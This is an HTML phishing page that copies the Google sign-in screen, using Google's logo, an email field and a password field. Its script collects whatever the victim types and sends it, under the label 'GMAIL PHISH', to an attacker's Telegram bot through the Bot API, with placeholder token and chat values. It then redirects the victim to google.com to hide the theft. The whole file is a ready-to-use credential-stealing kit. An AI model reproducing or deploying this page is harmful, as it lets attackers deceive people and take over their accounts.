<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in â€“ Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body, html {
      height: 100%;
      font-family: 'Roboto', sans-serif;
      overflow: hidden;
    }
    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: -1;
      overflow: hidden;
    }
    .background video {
      min-width: 100%;
      min-height: 100%;
      object-fit: cover;
    }
    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 40px;
      width: 360px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
      color: #fff;
    }
    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 75px;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 20px;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      background: rgba(255, 255, 255, 0.2);
      color: #fff;
      font-size: 14px;
    }
    input::placeholder {
      color: #ddd;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    .spinner {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 15px;
    }
    .spinner div {
      width: 20px;
      height: 20px;
      border: 3px solid #fff;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="background">
    <video autoplay muted loop>
      <source src="https://cdn.coverr.co/videos/coverr-network-connection-4786/1080p.mp4" type="video/mp4">
    </video>
  </div>
  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h2>Sign in</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email or phone" required>
      <input type="password" id="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
      <div class="spinner" id="spinner"><div></div></div>
    </form>
  </div>  <script>
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      document.getElementById('spinner').style.display = 'flex';

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: CHAT_ID,
        text: message
      };

      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      window.location.href = 'https://www.google.com';
    });
  </script></body>
</html>
